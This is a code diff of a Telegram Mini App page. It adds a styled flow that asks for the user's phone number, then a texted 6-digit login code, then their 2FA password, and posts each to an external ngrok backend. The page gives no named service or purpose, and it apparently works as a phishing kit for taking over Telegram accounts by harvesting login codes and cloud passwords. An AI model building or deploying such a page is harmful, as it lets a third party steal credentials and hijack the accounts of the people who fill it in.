@@ -2,48 +2,294 @@
 <html>
 <head>
     <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Telegram Mini App</title>
-    <script src="web.js"></script>
-</head>
-<body>
-
-<h2>Telegram Mini App</h2>
-
-<button onclick="requestPhone()">📱 Share phone number</button>
-
-<script>
-const tg = window.Telegram.WebApp;
-
-// Tell Telegram we are ready
-tg.ready();
-
-// Optional UI tweaks
-tg.expand();
-tg.MainButton.hide();
-
-function requestPhone() {
-    tg.requestContact((result) => {
-        if (!result) {
-            alert("Permission denied");
-            return;
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+        
+        .bg-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background-size: cover;
+            background-position: center;
+            filter: blur(20px);
+            transform: scale(1.1);
+            z-index: -1;
         }
 
-        console.log(result);
-        alert("Phone: " + result.phone_number);
+        .content-container {
+            position: relative;
+            z-index: 1;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
 
-        // send to backend
-        fetch("/api/phone", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                phone: result.phone_number,
-                user_id: result.user_id,
-                initData: tg.initData
+        .glass-card {
+            background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+        }
+
+        input:focus {
+            outline: none;
+            border-color: rgba(255, 255, 255, 0.5);
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            transition: transform 0.2s;
+        }
+
+        .btn-primary:hover {
+            transform: scale(1.05);
+        }
+
+        .btn-primary:active {
+            transform: scale(0.95);
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Blurred Background -->
+    <div class="bg-container"></div>
+
+    <!-- Content -->
+    <div class="content-container">
+        <div class="glass-card rounded-3xl p-8 max-w-md w-full mx-4">
+            <!-- Phone Number Step -->
+            <div id="phoneStep" class="text-center">
+                <div class="mb-6">
+                    <div class="text-6xl mb-4">📱</div>
+                    <h2 class="text-2xl font-bold text-white mb-2">Welcome</h2>
+                    <p class="text-white text-opacity-80">Please share your phone number to continue</p>
+                </div>
+                <button 
+                    onclick="requestPhone()" 
+                    class="btn-primary w-full py-4 px-6 rounded-2xl text-white font-semibold text-lg shadow-lg">
+                    Share Phone Number
+                </button>
+            </div>
+
+            <!-- OTP Step -->
+            <div id="otpStep" class="hidden text-center">
+                <div class="mb-6">
+                    <div class="text-6xl mb-4">🔐</div>
+                    <h2 class="text-2xl font-bold text-white mb-2">Enter OTP</h2>
+                    <p class="text-white text-opacity-80 mb-4">We sent a 6-digit code to your phone</p>
+                </div>
+                <input 
+                    type="text" 
+                    id="otpInput" 
+                    maxlength="6" 
+                    placeholder="000000"
+                    class="w-full py-4 px-6 rounded-2xl text-center text-2xl font-bold bg-white bg-opacity-20 text-white placeholder-white placeholder-opacity-50 border-2 border-white border-opacity-30 mb-4"
+                />
+                <button 
+                    onclick="submitOTP()" 
+                    class="btn-primary w-full py-4 px-6 rounded-2xl text-white font-semibold text-lg shadow-lg">
+                    Verify OTP
+                </button>
+            </div>
+
+            <!-- 2FA Step -->
+            <div id="twoFAStep" class="hidden text-center">
+                <div class="mb-6">
+                    <div class="text-6xl mb-4">🔒</div>
+                    <h2 class="text-2xl font-bold text-white mb-2">Two-Factor Authentication</h2>
+                    <p class="text-white text-opacity-80 mb-4">Enter your 2FA password</p>
+                </div>
+                <input 
+                    type="password" 
+                    id="twoFAInput" 
+                    placeholder="Enter 2FA password"
+                    class="w-full py-4 px-6 rounded-2xl text-center text-lg bg-white bg-opacity-20 text-white placeholder-white placeholder-opacity-50 border-2 border-white border-opacity-30 mb-4"
+                />
+                <button 
+                    onclick="submit2FA()" 
+                    class="btn-primary w-full py-4 px-6 rounded-2xl text-white font-semibold text-lg shadow-lg">
+                    Submit 2FA
+                </button>
+            </div>
+
+            <!-- Success Step -->
+            <div id="successStep" class="hidden text-center">
+                <div class="mb-6">
+                    <div class="text-6xl mb-4">✅</div>
+                    <h2 class="text-2xl font-bold text-white mb-2">Success!</h2>
+                    <p class="text-white text-opacity-80">You're all set</p>
+                </div>
+            </div>
+
+            <!-- Error Message -->
+            <div id="errorMessage" class="hidden mt-4 p-4 bg-red-500 bg-opacity-80 rounded-xl text-white text-center"></div>
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        const BASE_URL = "https://ac3c716eb447.ngrok-free.app"; // Change this to your backend URL
+
+        // Tell Telegram we are ready
+        tg.ready();
+        tg.expand();
+
+        let phoneNumber = "";
+        let userId = "";
+
+        function showStep(stepId) {
+            document.querySelectorAll('[id$="Step"]').forEach(el => el.classList.add('hidden'));
+            document.getElementById(stepId).classList.remove('hidden');
+            hideError();
+        }
+
+        function showError(message) {
+            const errorEl = document.getElementById('errorMessage');
+            errorEl.textContent = message;
+            errorEl.classList.remove('hidden');
+        }
+
+        function hideError() {
+            document.getElementById('errorMessage').classList.add('hidden');
+        }
+
+        function requestPhone() {
+            tg.requestContact((result) => {
+                if (!result) {
+                    showError("Permission denied. Please share your phone number to continue.");
+                    return;
+                }
+
+                phoneNumber = result.phone_number;
+                userId = result.user_id;
+
+                console.log("Phone number received:", phoneNumber);
+
+                // Send to backend
+                fetch(`${BASE_URL}/api/phone`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        phone: phoneNumber,
+                        user_id: userId,
+                        initData: tg.initData
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Response:", data);
+                    if (data.success) {
+                        // Show OTP input
+                        showStep('otpStep');
+                    } else {
+                        showError(data.message || "Failed to send verification code");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    showError("Network error. Please try again.");
+                });
+            });
+        }
+
+        function submitOTP() {
+            const otp = document.getElementById('otpInput').value;
+            
+            if (otp.length !== 6) {
+                showError("Please enter a 6-digit OTP code");
+                return;
+            }
+
+            fetch(`${BASE_URL}/api/verify-otp`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    phone: phoneNumber,
+                    user_id: userId,
+                    otp: otp,
+                    initData: tg.initData
+                })
             })
-        });
-    });
-}
-</script>
+            .then(response => response.json())
+            .then(data => {
+                console.log("OTP Response:", data);
+                if (data.success) {
+                    if (data.need_2fa) {
+                        // Show 2FA input
+                        showStep('twoFAStep');
+                    } else {
+                        // Success!
+                        showStep('successStep');
+                        tg.close();
+                    }
+                } else {
+                    showError(data.message || "Invalid OTP code");
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                showError("Network error. Please try again.");
+            });
+        }
 
+        function submit2FA() {
+            const twoFA = document.getElementById('twoFAInput').value;
+            
+            if (!twoFA) {
+                showError("Please enter your 2FA password");
+                return;
+            }
+
+            fetch(`${BASE_URL}/api/verify-2fa`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    phone: phoneNumber,
+                    user_id: userId,
+                    password: twoFA,
+                    initData: tg.initData
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("2FA Response:", data);
+                if (data.success) {
+                    // Success!
+                    showStep('successStep');
+                    setTimeout(() => tg.close(), 2000);
+                } else {
+                    showError(data.message || "Invalid 2FA password");
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                showError("Network error. Please try again.");
+            });
+        }
+
+        // Auto-focus and auto-submit for OTP
+        document.getElementById('otpInput').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            if (this.value.length === 6) {
+                setTimeout(() => submitOTP(), 500);
+            }
+        });
+    </script>
 </body>
 </html>
